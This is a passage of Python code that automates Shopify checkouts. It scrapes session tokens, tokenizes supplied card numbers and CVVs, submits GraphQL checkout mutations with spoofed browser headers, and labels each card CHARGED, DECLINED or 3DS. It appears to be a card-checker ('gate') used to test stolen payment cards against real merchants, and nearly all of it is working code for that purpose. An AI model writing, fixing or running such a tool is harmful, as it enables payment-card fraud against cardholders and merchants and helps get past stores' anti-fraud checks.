                if '<html' in page_content.lower() or '<!doctype' in page_content.lower():
                    print("✅ Content appears to be valid HTML")
                    return page_content
                else:
                    # Content might still be compressed despite headers
                    print("⚠️ Content doesn't look like HTML, trying fallback decompression...")
                    
                    # Try gzip decompression as fallback
                    try:
                        import gzip
                        page_content = gzip.decompress(raw_content).decode('utf-8')
                        if '<html' in page_content.lower():
                            print("✅ Fallback gzip decompression successful")
                            return page_content
                    except:
                        pass
                    
                    # Try deflate decompression as fallback
                    try:
                        import zlib
                        page_content = zlib.decompress(raw_content).decode('utf-8')
                        if '<html' in page_content.lower():
                            print("✅ Fallback deflate decompression successful")
                            return page_content
                    except:
                        pass
                    
                    # Return original content if all fails
                    try:
                        return raw_content.decode('utf-8')
                    except:
                        return str(raw_content)
                        
            except Exception as e:
                print(f"⚠️ Decompression error: {e}")
                try:
                    return raw_content.decode('utf-8')
                except:
                    return str(raw_content)
        
        page_content = decompress_response(checkout_resp)
        print(f"✅ Checkout page loaded ({len(page_content)} chars)")
        
        # FIXED: Extract the total amount from the checkout page HTML
        actual_total = None
        try:
            # Look for total amount in checkout page like PHP does
            total_patterns = [
                ('"totalAmount":{"amount":"', '"'),
                ('"total":{"amount":"', '"'),
                ('"checkoutTotal":{"amount":"', '"'),
                ('data-checkout-total="', '"'),
                ('data-total-price="', '"'),
                ('"amount":"', '"'), # Generic amount pattern
            ]
            
            for start_pattern, end_pattern in total_patterns:
                total_match = find_between(page_content, start_pattern, end_pattern)
                if total_match and total_match.replace('.', '').isdigit():
                    # Convert cents to dollars if needed
                    total_float = float(total_match)
                    if total_float > 100:  # Likely in cents
                        actual_total = str(total_float / 100)
                    else:
                        actual_total = str(total_float)
                    print(f"✅ Found total from checkout page: ${actual_total}")
                    break
            
            # If still not found, try regex patterns
            if not actual_total:
                import re
                total_regex_patterns = [
                    r'"totalAmount":\s*{\s*"amount":\s*"([^"]+)"',
                    r'"total":\s*{\s*"amount":\s*"([^"]+)"',
                    r'"checkoutTotal":\s*{\s*"amount":\s*"([^"]+)"',
                    r'data-checkout-total="([^"]+)"',
                    r'data-total-price="([^"]+)"',
                ]
                
                for pattern in total_regex_patterns:
                    matches = re.findall(pattern, page_content)
                    if matches:
                        total_match = matches[0]
                        if total_match and total_match.replace('.', '').isdigit():
                            total_float = float(total_match)
                            if total_float > 100:  # Likely in cents
                                actual_total = str(total_float / 100)
                            else:
                                actual_total = str(total_float)
                            print(f"✅ Found total via regex: ${actual_total}")
                            break
            
        except Exception as e:
            print(f"⚠️ Could not extract total from checkout page: {e}")
        
        # If we couldn't extract the total from checkout page, calculate it (product + estimated shipping/tax)
        if not actual_total:
            product_price = float(product_details['price'])
            estimated_shipping = 5.00  # Typical Shopify shipping
            estimated_tax = product_price * 0.08  # 8% tax estimate
            actual_total = str(round(product_price + estimated_shipping + estimated_tax, 2))
            print(f"✅ Using estimated total: ${actual_total} (product: ${product_price} + shipping: $5.00 + tax: ${estimated_tax:.2f})")
        
        # FIXED: Extract tokens using exact PHP patterns
        def extract_token_php_style(content, start_pattern, end_pattern, token_name):
            """Extract token using exact PHP find_between logic"""
            start_pos = content.find(start_pattern)
            if start_pos == -1:
                print(f"❌ {token_name}: start pattern '{start_pattern}' not found")
                return None
            
            start_pos += len(start_pattern)
            end_pos = content.find(end_pattern, start_pos)
            if end_pos == -1:
                print(f"❌ {token_name}: end pattern '{end_pattern}' not found after start")
                return None
            
            token = content[start_pos:end_pos]
            if token:
                print(f"✅ {token_name}: {token[:20]}...")
                return token
            else:
                print(f"❌ {token_name}: empty token extracted")
                return None
        
        # Extract web_build_id using PHP pattern
        web_build_id = extract_token_php_style(page_content, 'sha&quot;:&quot;', '&quot;}', 'Web build ID')
        if not web_build_id:
            print("❌ Web build ID extraction failed")
            return {'result': 'ERROR', 'message': 'Web build ID extraction failed'}
        
        # Extract session token using PHP pattern
        x_checkout_one_session_token = extract_token_php_style(
            page_content, 
            '<meta name="serialized-session-token" content="&quot;', 
            '&quot;"', 
            'Session token'
        )
        if not x_checkout_one_session_token:
            print("❌ Session token extraction failed")
            return {'result': 'ERROR', 'message': 'Session token extraction failed'}
        
        # Extract queue token using PHP pattern
        queue_token = extract_token_php_style(page_content, 'queueToken&quot;:&quot;', '&quot;', 'Queue token')
        if not queue_token:
            print("❌ Queue token extraction failed")
            return {'result': 'ERROR', 'message': 'Queue token extraction failed'}
        
        # Extract stable ID using PHP pattern
        stable_id = extract_token_php_style(page_content, 'stableId&quot;:&quot;', '&quot;', 'Stable ID')
        if not stable_id:
            print("❌ Stable ID extraction failed")
            return {'result': 'ERROR', 'message': 'Stable ID extraction failed'}
        
        # Extract payment method identifier using PHP pattern
        payment_method_identifier = extract_token_php_style(
            page_content, 
            'paymentMethodIdentifier&quot;:&quot;', 
            '&quot;', 
            'Payment method identifier'
        )
        if not payment_method_identifier:
            print("❌ Payment method identifier extraction failed")
            return {'result': 'ERROR', 'message': 'Payment method identifier extraction failed'}
        
        # Extract checkout token from URL
        checkout_token = ''
        if '/cn/' in checkout_url:
            import re
            matches = re.findall(r'/cn/([^\/?]+)', checkout_url)
            if matches:
                checkout_token = matches[0]
                print(f"✅ Checkout token: {checkout_token[:20]}...")
            else:
                print("❌ Checkout token extraction from URL failed")
                return {'result': 'ERROR', 'message': 'Checkout token extraction failed'}
        
        # Step 3: Create card token using Shopify's card service
        print("💳 Creating card token...")
        
        card_payload = {
            "credit_card": {
                "number": cc,
                "month": int(mes),
                "year": int(ano),
                "verification_value": cvv,
                "start_month": None,
                "start_year": None,
                "issue_number": "",
                "name": f"{address_data['first_name']} {address_data['last_name']}"
            },
            "payment_session_scope": domain
        }
        
        card_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.shopifycs.com',
            'referer': 'https://checkout.shopifycs.com/',
            'user-agent': headers['User-Agent']
        }
        
        card_resp = session.post(
            'https://deposit.shopifycs.com/sessions',
            json=card_payload,
            headers=card_headers,
            timeout=30
        )
        
        if card_resp.status_code != 200:
            return {'result': 'DECLINED', 'message': f'Card tokenization failed: {card_resp.status_code}'}
        
        try:
            card_data = card_resp.json()
            cc_token = card_data.get('id')
            if not cc_token:
                return {'result': 'DECLINED', 'message': 'Card token creation failed'}
            print(f"✅ Card token created: {cc_token[:20]}...")
        except:
            return {'result': 'DECLINED', 'message': 'Invalid card response'}
        
        # Extract product variant ID from the stable_id or use checkout token as fallback
        # FIXED: Use the actual product variant ID, not the stable_id
        variant_id = product_details['id']  # This is the actual variant ID from products.json
        
        # Step 4: Submit Proposal using GraphQL with exact PHP structure
        print("📋 Submitting checkout proposal...")
        
        proposal_query = """
        query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){
          session(sessionInput:$sessionInput){
            negotiate(input:{
              purchaseProposal:{
                alternativePaymentCurrency:$alternativePaymentCurrency,
                delivery:$delivery,
                discounts:$discounts,
                payment:$payment,
                merchandise:$merchandise,
                buyerIdentity:$buyerIdentity,
                taxes:$taxes,
                reduction:$reduction,
                availableRedeemables:$availableRedeemables,
                tip:$tip,
                note:$note,
                poNumber:$poNumber,
                nonNegotiableTerms:$nonNegotiableTerms,
                localizationExtension:$localizationExtension,
                scriptFingerprint:$scriptFingerprint,
                transformerFingerprintV2:$transformerFingerprintV2,
                optionalDuties:$optionalDuties,
                attribution:$attribution,
                captcha:$captcha,
                saleAttributions:$saleAttributions
              },
              checkpointData:$checkpointData,
              queueToken:$queueToken,
              changesetTokens:$changesetTokens
            }){
              __typename 
              result{
                __typename
                ... on NegotiationResultAvailable {
                  checkpointData
                  queueToken
                  sellerProposal {
                    delivery {
                      ... on FilledDeliveryTerms {
                        deliveryLines {
                          selectedDeliveryStrategy {
                            ... on CompleteDeliveryStrategy {
                              handle
                            }
                            ... on DeliveryStrategyReference {
                              handle
                            }
                          }
                          availableDeliveryStrategies {
                            ... on CompleteDeliveryStrategy {
                              handle
                              amount {
                                ... on MoneyValueConstraint {
                                  value {
                                    amount
                                    currencyCode
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                    tax {
                      ... on FilledTaxTerms {
                        totalTaxAmount {
                          ... on MoneyValueConstraint {
                            value {
                              amount
                              currencyCode
                            }
                          }
                        }
                      }
                    }
                    runningTotal {
                      ... on MoneyValueConstraint {
                        value {
                          amount
                          currencyCode
                        }
                      }
                    }
                  }
                }
              }
              errors{
                code 
                localizedMessage 
                __typename
              }
            }
          }
        }
        """
        
        # Get country-specific address data
        country_code = "US"  # Default to US
        if address_data.get('country'):
            country_code = address_data['country']
        
        # FIXED: Use exact PHP variable structure
        proposal_variables = {
            "sessionInput": {"sessionToken": x_checkout_one_session_token},
            "queueToken": queue_token,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "partialStreetAddress": {
                            "address1": address_data['address1'],
                            "address2": "",
                            "city": address_data['city'],
                            "countryCode": country_code,
                            "postalCode": address_data['zip'],
                            "firstName": address_data['first_name'],
                            "lastName": address_data['last_name'],
                            "zoneCode": address_data['province'],
                            "phone": address_data['phone'],
                            "oneTimeUse": False,
                            "coordinates": {"latitude": 40.7128, "longitude": -74.0060}
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [{"name": "_minimum_allowed", "value": {"string": ""}}],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {"amount": product_details['price'], "currencyCode": "USD"}},
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": address_data['address1'],
                        "address2": "",
                        "city": address_data['city'],
                        "countryCode": country_code,
                        "postalCode": address_data['zip'],
                        "firstName": address_data['first_name'],
                        "lastName": address_data['last_name'],
                        "zoneCode": address_data['province'],
                        "phone": address_data['phone']
                    }
                }
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": country_code},
                "email": address_data['email'],
                "emailChanged": False,
                "phoneCountryCode": country_code,
                "marketingConsent": [],
                "shopPayOptInPhone": {"countryCode": country_code},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"any": True},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False}
        }
        
        proposal_payload = {
            "query": proposal_query,
            "variables": proposal_variables,
            "operationName": "Proposal"
        }
        
        # FIXED: Use exact PHP headers
        proposal_headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB',
            'content-type': 'application/json',
            'origin': base_url,
            'referer': f'{base_url}/',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build_id,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'no',
            'x-checkout-web-source-id': checkout_token
        }
        
        proposal_resp = session.post(
            f'{base_url}/checkouts/unstable/graphql?operationName=Proposal',
            json=proposal_payload,
            headers=proposal_headers,
            timeout=30
        )
        
        if proposal_resp.status_code != 200:
            print(f"❌ Proposal request failed with status {proposal_resp.status_code}")
            print(f"Response: {proposal_resp.text[:500]}...")
            return {'result': 'ERROR', 'message': f'Proposal failed: {proposal_resp.status_code} - {proposal_resp.text[:100]}'}
        
        # Extract proposal values and check for errors
        proposal_result = parse_proposal_response(proposal_resp, product_details)
        if 'result' in proposal_result and proposal_result['result'] == 'ERROR':
            return proposal_result
        
        # proposal_result now contains the extracted values
        proposal_values = proposal_result
        
        # FIXED: Update actual_total to use the proposal extracted total
        if proposal_values and proposal_values.get('total_amount'):
            actual_total = proposal_values['total_amount']
            print(f"✅ Updated actual_total from proposal: ${actual_total}")
        else:
            print(f"⚠️ Using estimated actual_total: ${actual_total}")
        
        # Step 5: Submit for completion using GraphQL
        print("🎯 Submitting for completion...")
        
        # Get extracted values from proposal (now proposal returns the extracted values)
        proposal_values = proposal_result if isinstance(proposal_result, dict) and 'handle' in proposal_result else None
        if not proposal_values:
            return {'result': 'ERROR', 'message': 'Failed to get proposal values for completion'}
        
        completion_query = """
        mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){
          submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){
            ...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}
            ...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}
            ...on SubmitFailed{reason __typename}
            ...on SubmitRejected{
              buyerProposal{buyerIdentity{...on FilledBuyerIdentityTerms{email __typename}__typename}__typename}
              sellerProposal{total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}
              errors{...on NegotiationError{code localizedMessage __typename}__typename}
              __typename
            }
            ...on Throttled{pollAfter pollUrl queueToken __typename}
            ...on CheckpointDenied{redirectUrl __typename}
            ...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}
            __typename
          }
        }
        fragment ReceiptDetails on Receipt{
          ...on ProcessedReceipt{
            id token redirectUrl 
            confirmationPage{url shouldRedirect __typename}
            analytics{checkoutCompletedEventId __typename}
            poNumber 
            orderIdentity{buyerIdentifier id __typename}
            customerId 
            eligibleForMarketingOptIn 
            paymentDetails{
              paymentCardBrand 
              creditCardLastFourDigits 
              paymentAmount{amount currencyCode __typename}
              paymentGateway 
              financialPendingReason 
              paymentDescriptor 
              __typename
            }
            __typename
          }
          ...on ProcessingReceipt{
            id 
            pollDelay 
            __typename
          }
          ...on WaitingReceipt{
            id 
            pollDelay 
            __typename
          }
          ...on ActionRequiredReceipt{
            id 
            action{
              ...on CompletePaymentChallenge{
                offsiteRedirect 
                url 
                __typename
              }
              __typename
            }
            timeout{millisecondsRemaining __typename}
            __typename
          }
          ...on FailedReceipt{
            id 
            processingError{
              ...on InventoryClaimFailure{__typename}
              ...on InventoryReservationFailure{__typename}
              ...on OrderCreationFailure{paymentsHaveBeenReverted __typename}
              ...on OrderCreationSchedulingFailure{__typename}
              ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}
              ...on DiscountUsageLimitExceededFailure{__typename}
              ...on CustomerPersistenceFailure{__typename}
              __typename
            }
            __typename
          }
          __typename
        }
        """
        
        # FIXED: Use extracted values from proposal like PHP does
        completion_variables = {
            "input": {
                "sessionInput": {"sessionToken": x_checkout_one_session_token},
                "queueToken": queue_token,
                "discounts": {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True
                },
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "streetAddress": {
                                "address1": address_data['address1'],
                                "address2": "",
                                "city": address_data['city'],
                                "countryCode": country_code,
                                "postalCode": address_data['zip'],
                                "firstName": address_data['first_name'],
                                "lastName": address_data['last_name'],
                                "zoneCode": address_data['province'],
                                "phone": address_data['phone'],
                                "oneTimeUse": False,
                                "coordinates": {"latitude": 40.7128, "longitude": -74.0060}
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": proposal_values['handle'],  # Use extracted handle
                                "customDeliveryRate": False
                            },
                            "options": {}
                        },
                        "targetMerchandiseLines": {
                            "lines": [{"stableId": stable_id}]
                        },
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {
                            "value": {
                                "amount": proposal_values['delivery_amount'],  # Use extracted delivery amount
                                "currencyCode": "USD"
                            }
                        },
                        "destinationChanged": False
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
                "deliveryExpectations": {
                    "deliveryExpectationLines": []
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {
                            "value": {
                                "amount": product_details['price'],
                                "currencyCode": "USD"
                            }
                        },
                        "lineComponentsSource": None,
                        "lineComponents": []
                    }]
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": country_code
                    },
                    "email": address_data['email'],
                    "emailChanged": False,
                    "phone": address_data['phone'],
                    "phoneCountryCode": country_code,
                    "marketingConsent": [],
                    "shopPayOptInPhone": {
                        "countryCode": country_code
                    },
                    "rememberMe": False
                },
                "payment": {
                    # FIXED: Use "any": true like PHP does, not specific values
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": payment_method_identifier,
                                "sessionId": cc_token,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": address_data['address1'],
                                        "address2": "",
                                        "city": address_data['city'],
                                        "countryCode": country_code,
                                        "postalCode": address_data['zip'],
                                        "firstName": address_data['first_name'],
                                        "lastName": address_data['last_name'],
                                        "zoneCode": address_data['province'],
                                        "phone": address_data['phone']
                                    }
                                },
                                "cardSource": None
                            }
                        },
                        # FIXED: Use exact total amount like PHP does
                        "amount": {
                            "any": True
                        },
                        "dueAt": None
                    }],
                    # Add billing address like PHP does
                    "billingAddress": {
                        "streetAddress": {
                            "address1": address_data['address1'],
                            "address2": "",
                            "city": address_data['city'],
                            "countryCode": country_code,
                            "postalCode": address_data['zip'],
                            "firstName": address_data['first_name'],
                            "lastName": address_data['last_name'],
                            "zoneCode": address_data['province'],
                            "phone": address_data['phone']
                        }
                    }
                },
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"any": True},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "tip": {"tipLines": []},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": []
                },
                "optionalDuties": {"buyerRefusesDuties": False}
            },
            "attemptToken": f"{checkout_token}-0a6d87fj9zmj",
            # Add analytics like PHP does  
            "analytics": {
                "requestUrl": f"{base_url}/checkouts/cn/{checkout_token}",
                "pageId": stable_id
            }
        }
        
        completion_payload = {
            "query": completion_query,
            "variables": completion_variables,
            "operationName": "SubmitForCompletion"
        }
        
        completion_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': base_url,
            'referer': f'{base_url}/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'no',
            'x-checkout-web-source-id': checkout_token
        }
        
        completion_resp = session.post(
            f'{base_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion',
            json=completion_payload,
            headers=completion_headers,
            timeout=30
        )
        
        if completion_resp.status_code != 200:
            print(f"❌ Completion request failed with status {completion_resp.status_code}")
            print(f"Response: {completion_resp.text[:500]}...")
            return {'result': 'ERROR', 'message': f'Completion failed: {completion_resp.status_code} - {completion_resp.text[:100]}'}
        
        try:
            completion_data = completion_resp.json()
            print(f"✅ Completion response received")
            print(f"🔍 Debug: Completion response keys: {list(completion_data.keys()) if completion_data else 'None'}")
            
            # Check for GraphQL errors first
            if 'errors' in completion_data:
                errors = completion_data['errors']
                error_messages = [error.get('message', 'Unknown error') for error in errors]
                print(f"❌ GraphQL errors in completion: {error_messages}")
                return {'result': 'ERROR', 'message': f'Completion GraphQL errors: {", ".join(error_messages)}'}
            
            # Check for CAPTCHA like PHP does
            if 'CAPTCHA_METADATA_MISSING' in completion_resp.text:
                return {'result': 'ERROR', 'message': 'CAPTCHA detected'}
            
            # Get submit result and analyze like PHP does
            submit_result = completion_data.get('data', {}).get('submitForCompletion')
            print(f"🔍 Debug: submitForCompletion type: {submit_result.get('__typename') if submit_result else 'None'}")
            
            if submit_result:
                # FIXED: Extract receipt ID like PHP does
                receipt_id = None
                receipt = None
                if 'receipt' in submit_result and submit_result['receipt'].get('id'):
                    receipt_id = submit_result['receipt']['id']
                    receipt = submit_result['receipt']
                    print(f"✅ Receipt ID extracted: {receipt_id}")
                
                # Handle SubmitFailed like PHP does
                if submit_result.get('__typename') == 'SubmitFailed':
                    reason = submit_result.get('reason', 'Payment failed')
                    print(f"❌ Payment submission failed: {reason}")
                    return {'result': 'DECLINED', 'message': reason, 'actual_total': actual_total}
                
                # Handle SubmitRejected with proper error extraction like PHP does
                elif submit_result.get('__typename') == 'SubmitRejected':
                    errors = submit_result.get('errors', [])
                    if errors:
                        # Extract the most descriptive error message
                        error_msg = None
                        for error in errors:
                            # Try different error message fields
                            if error.get('localizedMessage'):
                                error_msg = error['localizedMessage']
                                break
                            elif error.get('nonLocalizedMessage'):
                                error_msg = error['nonLocalizedMessage']
                                break
                            elif error.get('code'):
                                error_msg = error['code']
                                break
                        
                        if not error_msg:
                            error_msg = 'Payment rejected'
                        
                        print(f"❌ Payment rejected: {error_msg}")
                        return {'result': 'DECLINED', 'message': error_msg, 'actual_total': actual_total}
                    return {'result': 'DECLINED', 'message': 'Payment rejected', 'actual_total': actual_total}
                
                # Handle other response types
                elif submit_result.get('__typename') == 'CheckpointDenied':
                    return {'result': 'ERROR', 'message': 'Checkout checkpoint denied'}
                elif submit_result.get('__typename') == 'Throttled':
                    return {'result': 'ERROR', 'message': 'Request throttled by Shopify'}
                
                # FIXED: If we have a receipt ID, use PHP-style polling approach to get final status
                if receipt_id:
                    print(f"💡 Polling for receipt status like PHP...")
                    
                    # Step 6: Poll for receipt status like PHP does
                    import time
                    time.sleep(2)  # PHP uses sleep(5), we'll use 2 for faster response
                    
                    poll_query = """
                    query PollForReceipt($receiptId:ID!,$sessionToken:String!){
                      receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){
                        ...ReceiptDetails 
                        __typename
                      }
                    }
                    fragment ReceiptDetails on Receipt{
                      ...on ProcessedReceipt{
                        id token redirectUrl 
                        confirmationPage{url shouldRedirect __typename}
                        analytics{checkoutCompletedEventId __typename}
                        poNumber 
                        orderIdentity{buyerIdentifier id __typename}
                        customerId 
                        eligibleForMarketingOptIn 
                        paymentDetails{
                          paymentCardBrand 
                          creditCardLastFourDigits 
                          paymentAmount{amount currencyCode __typename}
                          paymentGateway 
                          financialPendingReason 
                          paymentDescriptor 
                          __typename
                        }
                        __typename
                      }
                      ...on ProcessingReceipt{
                        id 
                        pollDelay 
                        __typename
                      }
                      ...on WaitingReceipt{
                        id 
                        pollDelay 
                        __typename
                      }
                      ...on ActionRequiredReceipt{
                        id 
                        action{
                          ...on CompletePaymentChallenge{
                            offsiteRedirect 
                            url 
                            __typename
                          }
                          __typename
                        }
                        timeout{millisecondsRemaining __typename}
                        __typename
                      }
                      ...on FailedReceipt{
                        id 
                        processingError{
                          ...on InventoryClaimFailure{__typename}
                          ...on InventoryReservationFailure{__typename}
                          ...on OrderCreationFailure{paymentsHaveBeenReverted __typename}
                          ...on OrderCreationSchedulingFailure{__typename}
                          ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}
                          ...on DiscountUsageLimitExceededFailure{__typename}
                          ...on CustomerPersistenceFailure{__typename}
                          __typename
                        }
                        __typename
                      }
                      __typename
                    }
                    """
                    
                    poll_variables = {
                        "receiptId": receipt_id,
                        "sessionToken": x_checkout_one_session_token
                    }
                    
                    poll_payload = {
                        "query": poll_query,
                        "variables": poll_variables,
                        "operationName": "PollForReceipt"
                    }
                    
                    poll_headers = {
                        'accept': 'application/json',
                        'accept-language': 'en-US',
                        'content-type': 'application/json',
                        'origin': base_url,
                        'referer': base_url,
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                        'x-checkout-one-session-token': x_checkout_one_session_token,
                        'x-checkout-web-build-id': web_build_id,
                        'x-checkout-web-deploy-stage': 'production',
                        'x-checkout-web-server-handling': 'fast',
                        'x-checkout-web-server-rendering': 'no',
                        'x-checkout-web-source-id': checkout_token
                    }
                    
                    poll_resp = session.post(
                        f'{base_url}/checkouts/unstable/graphql?operationName=PollForReceipt',
                        json=poll_payload,
                        headers=poll_headers,
                        timeout=30
                    )
                    
                    if poll_resp.status_code == 200:
                        try:
                            poll_data = poll_resp.json()
                            
                            # FIXED: Check for processing error like PHP does: if (isset($r5js->data->receipt->processingError->code))
                            receipt_data = poll_data.get('data', {}).get('receipt', {})
                            if receipt_data.get('processingError', {}).get('code'):
                                error_code = receipt_data['processingError']['code']
                                print(f"❌ Processing error in receipt: {error_code}")
                                return {'result': 'DECLINED', 'message': error_code, 'actual_total': actual_total}
                            
                            # FIXED: Use exact PHP success patterns for string checking
                            poll_response_text = poll_resp.text
                            
                            # PHP success checks - converted exactly
                            success_patterns = [
                                'CONFIRMING',
                                'PENDING', 
                                'REDIRECTING',
                                'RESOLVED',
                                'thank_you',
                                '/post_purchase',
                                '/thank-you',
                                '/post-purchase',
                                'processing?completed=true',
                                '__typename":"ProcessedReceipt"',
                                '/thank_you',
                                '/post_purchase'
                            ]
                            
                            success_found = False
                            for pattern in success_patterns:
                                if pattern in poll_response_text:
                                    print(f"✅ Found success pattern: {pattern}")
                                    success_found = True
                                    break
                            
                            if success_found:
                                return {'result': 'CHARGED', 'message': 'Your order is confirmed!', 'actual_total': actual_total}
                            
                            # PHP 3DS checks - converted exactly
                            threeds_patterns = [
                                'CompletePaymentChallenge',
                                'stripe/authentications/',
                                'AUTHENTICATION_FAILED',
                                '3dsecure'
                            ]
                            
                            for pattern in threeds_patterns:
                                if pattern in poll_response_text:
                                    print(f"🔐 Found 3DS pattern: {pattern}")
                                    return {'result': '3DS', 'message': '3DSecure Authentication Required', 'actual_total': actual_total}
                            
                            # PHP fallback: Response Is Empty
                            print(f"❓ No recognizable patterns found in poll response")
                            return {'result': 'DECLINED', 'message': 'Response Is Empty', 'actual_total': actual_total}
                            
                        except json.JSONDecodeError as e:
                            print(f"❌ Failed to parse poll response as JSON: {e}")
                            return {'result': 'DECLINED', 'message': 'Poll response parsing failed', 'actual_total': actual_total}
                        except Exception as e:
                            print(f"❌ Poll parsing error: {str(e)}")
                            return {'result': 'DECLINED', 'message': f'Poll parsing failed: {str(e)}', 'actual_total': actual_total}
                    else:
                        print(f"❌ Poll request failed with status {poll_resp.status_code}")
                        return {'result': 'DECLINED', 'message': f'Poll failed: {poll_resp.status_code}', 'actual_total': actual_total}
                
                else:
                    # Check the completion response text for specific patterns like PHP does
                    response_text = completion_resp.text.lower()
                    
                    # Success patterns like PHP checks
                    success_patterns = [
                        'confirming', 'pending', 'redirecting', 'resolved', 
                        'thank_you', '/post_purchase', '/thank-you', '/post-purchase',
                        'processing?completed=true', '__typename":"processedreceipt"'
                    ]
                    
                    if any(pattern in response_text for pattern in success_patterns):
                        return {'result': 'CHARGED', 'message': 'Your order is confirmed!', 'actual_total': actual_total}
                    
                    # 3DS patterns like PHP checks
                    threeds_patterns = [
                        'completepaymentchallenge', 'stripe/authentications/', 
                        'authentication_failed', '3dsecure'
                    ]
                    
